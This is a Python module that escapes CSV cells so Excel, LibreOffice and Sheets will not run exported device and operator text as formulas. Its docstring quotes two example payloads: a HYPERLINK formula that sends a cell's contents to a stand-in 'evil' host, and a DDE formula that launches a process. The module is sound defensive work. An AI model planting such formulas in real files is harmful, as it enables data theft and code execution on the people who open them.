"""CSV writing that a spreadsheet cannot be tricked into executing.

WHY THIS EXISTS
---------------
Every string this system exports originates somewhere hostile. Printer model
names, locations, front-panel messages and prtAlertDescription text come off
devices on customer LANs over SNMP; asset tags, display names and site names
are operator free-text. All of them land in the CSV exports, and an MSP's whole
workflow for those files is "open in Excel".

A cell whose first character is ``=``, ``+``, ``-``, ``@``, TAB or CR is not
data to Excel, LibreOffice or Google Sheets -- it is a *formula*, evaluated on
open. That is enough for ``=HYPERLINK("http://evil/?x="&A1,"Click")`` to
exfiltrate a neighbouring cell, and on Excel with legacy DDE enabled for
``=cmd|' /C calc'!A0`` to launch a process. Nothing in ``csv`` guards against
this: RFC 4180 quoting solves commas and newlines, which is a *parsing*
problem, and formula evaluation is a *rendering* problem one layer further on.
Quoting the field does not help, because the quotes are consumed by the CSV
parser before the spreadsheet ever sees the value.

The fix is the OWASP one: prefix a risky cell with an apostrophe, which every
major spreadsheet reads as "the rest of this cell is literal text" and does not
display. It is lossy by construction -- a value that genuinely started with
``=`` gains a character -- which is the correct trade for a file format whose
default consumer executes its contents.

WHAT IT DELIBERATELY DOES NOT MANGLE
------------------------------------
Negative numbers start with ``-``, and page counts, deltas and levels are
exactly what these exports are for. Blindly escaping every leading ``-`` would
turn every negative number into text and quietly break the arithmetic in the
spreadsheet the operator built on top of the export -- a real cost paid for no
security gain, since a number cannot be a formula. So numeric-looking values
pass through untouched, and non-numeric strings do not.
"""

from __future__ import annotations

import csv
import re
from typing import Any, Iterable, List

# The canonical formula-trigger set. TAB and CR are here because a leading
# control character is stripped by some importers, promoting the *next*
# character to first position -- so "\t=1+1" must be treated as risky too.
RISKY_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

# Anything a spreadsheet would store as a number rather than evaluate. Covers
# leading sign, decimals and exponent form ("-1", "+2.5", "1e-9", ".5").
_NUMERIC = re.compile(r"^[+-]?(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?$")

# Escape marker. An apostrophe is displayed by no spreadsheet and forces the
# cell to text in all of Excel, LibreOffice and Sheets.
ESCAPE = "'"


def is_risky(value: str) -> bool:
    """Would a spreadsheet evaluate this string rather than display it?

    Checks both the raw first character and the first character after leading
    whitespace: importers disagree about whether " =1+1" is a formula, so a
    value is risky if it is one under either reading. Numeric literals are
    never risky -- see the module docstring on why that carve-out matters.
    """
    if not value:
        return False
    if _NUMERIC.match(value.strip()):
        return False
    if value.startswith(RISKY_PREFIXES):
        return True
    stripped = value.lstrip(" \t\r\n")
    return bool(stripped) and stripped.startswith(RISKY_PREFIXES)


def sanitize_cell(value: Any) -> Any:
    """Neutralize one cell, leaving non-strings and safe strings untouched.

    ``None`` becomes an empty string so a null renders as a blank cell rather
    than the literal text "None". Ints, floats, bools and datetimes are handed
    back as-is for ``csv.writer`` to stringify: none of them can carry a
    formula, and round-tripping them through ``str`` here would only risk
    changing their formatting.
    """
    if value is None:
        return ""
    if not isinstance(value, str):
        return value
    return ESCAPE + value if is_risky(value) else value


def sanitize_row(row: Iterable[Any]) -> List[Any]:
    """``sanitize_cell`` across one row."""
    return [sanitize_cell(cell) for cell in row]


class SafeWriter:
    """A ``csv.writer`` whose every cell is run through :func:`sanitize_cell`.

    Deliberately a wrapper rather than a subclass: ``_csv.writer`` is a C type
    that cannot be subclassed, and wrapping keeps the escaping impossible to
    bypass by reaching for the underlying writer's ``writerow`` -- callers only
    ever hold this object.
    """

    __slots__ = ("_writer",)

    def __init__(self, writer: Any) -> None:
        self._writer = writer

    def writerow(self, row: Iterable[Any]) -> Any:
        return self._writer.writerow(sanitize_row(row))

    def writerows(self, rows: Iterable[Iterable[Any]]) -> None:
        for row in rows:
            self.writerow(row)


def safe_writer(fileobj: Any, **kwargs: Any) -> SafeWriter:
    """``csv.writer(fileobj, **kwargs)`` with formula-injection escaping.

    Drop-in for ``csv.writer`` at every call site that emits operator-facing
    CSV. Use this rather than ``csv.writer`` directly -- there is no export in
    this codebase whose values are all trusted.
    """
    return SafeWriter(csv.writer(fileobj, **kwargs))
